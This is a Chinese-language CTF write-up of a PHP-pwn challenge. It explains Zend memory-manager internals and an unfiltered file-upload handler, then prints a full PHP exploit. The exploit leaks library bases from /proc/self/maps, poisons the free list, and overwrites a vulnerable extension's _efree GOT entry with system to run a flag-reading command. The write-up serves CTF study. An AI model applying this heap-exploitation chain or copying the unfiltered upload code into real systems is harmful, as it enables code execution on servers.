---
title: 长城杯2025 (php-pwn) simi-final php-master 详解
contest: 长城杯
year: 2025
difficulty: hard
vuln_type: pwn_unknown
tags: [PHP-zend内存管理,zend_mm_heap,PHP扩展开发,_emalloc/_efree,PHP文件上传,gdbserver,xcache,system覆盖,vuln.so,GOT劫持]
attack_chain: 1. PHP zend内存管理:zend_parse_parameters解析参数+'l'=long,'s'=string+'size_t'+'b'=bool+'z'=zval+'a'=array+对象+可选|2. zend_mm_heap结构:use_custom_heap+size+peak+free_slot[ZEND_MM_BINS]+main_chunk+cached_chunks+chunks_count|3. _emalloc:小size走zend_mm_alloc_small+free_slot链表+大size走zend_mm_alloc_large+超大走zend_mm_alloc_huge|4. PHP文件上传:move_uploaded_file无任何filter直接上传到当前目录|5. gdbserver-7.10.1-x64:9191 php -S 0:80 exp.php|6. /proc/self/maps泄露libc_base+vuln.so_base|7. 覆盖vuln.so _efree.got为system→/readflag>/var/www/html/flag
key_payload: version: '3' services: php-master ports: ["80:80","28888:9191"] volumes: [./data:/var/www/html/exp]|move_uploaded_file($file['tmp_name'], $target_file)|get_so_base()从/proc/self/maps regex提取libc+vuln.so|construct(0x10); allocate(0,0x30); allocate(1,0x30); clear(); overwrite(1, p64($efree_got));|construct(0x10); allocate(0,0x30); allocate(1,0x30); overwrite(0, "/readflag>/var/www/html/flag\x00"); overwrite(1, p64($libc_base + $system_off)); clear();|gdbserver-7.10.1-x64 :9191 php -S 0:80 exp.php
one_liner: 长城杯2025 simi-final php-master详解:PHP文件上传+Docker gdbserver调试+zend内存管理(heap+bin+free_slot)逆向+vuln.so扩展的_efree.got劫持为system→/readflag>/var/www/html/flag
lesson: 1) zend_parse_parameters类型字符:l=long, d=double, s=string+size, b=bool, z=zval, a=array, O=object, |分隔可选参数; 2) zend_mm_heap结构:use_custom_heap开关+size/peak统计+free_slot[ZEND_MM_BINS]小对象bin+main_chunk/cached_chunks大块; 3) _emalloc三层:small(bin)→large(页)→huge; 4) PHP扩展hook _efree.got为system是PHP-PWN核心思路; 5) 文件上传move_uploaded_file无filter直接上传到web目录; 6) gdbserver调试:主机连容器9191端口,php -S 0:80+exp.php挂载; 7) /proc/self/maps正则提取libc+vuln.so基址
quality: high
---

## 备注

原文(https://www.ctfiot.com/249023.html)2025年长城杯 simi-final php-master详解,作者sparkle666(看雪ID)。

### 题目详情

**Docker环境**
```yaml
version: '3'
services:
  php-master:
    image: php-master:attachment-v1
    ports:
      - "80:80"      # 用于映射上传服务
      - "28888:9191"  # gdbserver本地连容器
      - "1111:8080"   # 触发exp.php调试
    volumes:
      - ./data:/var/www/html/exp
```

**PHP文件上传(无filter)**
```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['file'])) {
        $file = $_FILES['file'];
        $target_file = $upload_dir . basename($file['name']);
        $result = move_uploaded_file($file['tmp_name'], $target_file);
        // ...
    }
}
```

**zend_parse_parameters**
- 'l' = long/int
- 'd' = double
- 's' = string (with size_t)
- 'b' = bool
- 'z' = zval*
- 'a' = array
- 'O' = object
- '|' = 可选参数分隔符

**zend_mm_heap结构**
```c
struct _zend_mm_heap {
    int                use_custom_heap;
    zend_mm_storage   *storage;
    size_t             size;
    size_t             peak;
    zend_mm_free_slot *free_slot[ZEND_MM_BINS];
    size_t             real_size;
    size_t             real_peak;
    size_t             limit;
    int                overflow;
    zend_mm_huge_list *huge_list;
    zend_mm_chunk     *main_chunk;
    zend_mm_chunk     *cached_chunks;
    int                chunks_count;
    // ...
};

struct _zend_mm_chunk {
    zend_mm_heap      *heap;
    zend_mm_chunk     *next;
    zend_mm_chunk     *prev;
    uint32_t           free_pages;
    uint32_t           free_tail;
    uint32_t           num;
    char               reserve[64 - ...];
    zend_mm_heap       heap_slot;
    zend_mm_page_map   free_map;
    zend_mm_page_info  map[ZEND_MM_PAGES];
};
```

**_emalloc三层分配**
```c
ZEND_API void* _emalloc(size_t size) {
    if (size <= ZEND_MM_MAX_SMALL_SIZE)
        return zend_mm_alloc_small(heap, ZEND_MM_SMALL_SIZE_TO_BIN(size));
    else if (size <= ZEND_MM_MAX_LARGE_SIZE)
        return zend_mm_alloc_large(heap, size);
    else
        return zend_mm_alloc_huge(heap, size);
}
```

**zend_mm_alloc_small**
- free_slot[bin_num]有→直接取
- 否则zend_mm_alloc_small_slow:
  - zend_mm_alloc_pages申请页
  - 把bin从头切小块构建free_slot链表挂到heap->free_slot[bin_num]

**_efree_small**
- 链表头插:p->next_free_slot = heap->free_slot[bin_num]; heap->free_slot[bin_num] = p;

**EXP (gdbserver+php -S)**
```sh
./gdbserver-7.10.1-x64 :9191 php -S 0:80 exp.php
```

```php
$map_file = "/proc/self/map";
$system_off = 0x44AF0;
$libc_base = 0;
$vuln_so_base = 0;
$efree_got = 0x4060;

function get_so_base($buffer) {
    global $libc_base, $vuln_so_base;
    $libc_line_regex = "/([0-9a-f]+)-[0-9a-f]+ .* \/lib\/x86_64-linux-gnu\/libc-2.28.so/";
    $vuln_so_line_regex = "/([0-9a-f]+)-[0-9a-f]+ .* \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-[0-9]+\/vuln.so/";
    if (preg_match_all($libc_line_regex, $buffer, $matches))
        $libc_base = hexdec($matches[1][0]);
    if (preg_match_all($vuln_so_line_regex, $buffer, $matches))
        $vuln_so_base = hexdec($matches[1][0]);
}

ob_start();
include "/proc/self/maps";
$buffer = ob_get_contents();
ob_end_flush();
get_so_base($buffer);
$efree_got += $vuln_so_base;

construct(0x10);
allocate(0, 0x30);
allocate(1, 0x30);
clear();
overwrite(1, p64($efree_got));
construct(0x10);
allocate(0, 0x30);
allocate(1, 0x30);
overwrite(0, "/readflag>/var/www/html/flag\x00");
overwrite(1, p64($libc_base + $system_off));
clear();
```

## 评级

- **quality: high** — 完整PHP扩展PWN链,zend内存管理源码级逆向,gdbserver调试+Docker容器,经典PHP-PWN高阶实战
- **vuln_type: pwn_unknown** — PHP zend扩展PWN(非常规PWN)
- 实战价值:PHP扩展GOT劫持是PHP PWN的核心思路,zend内存管理理解是扩展开发基础
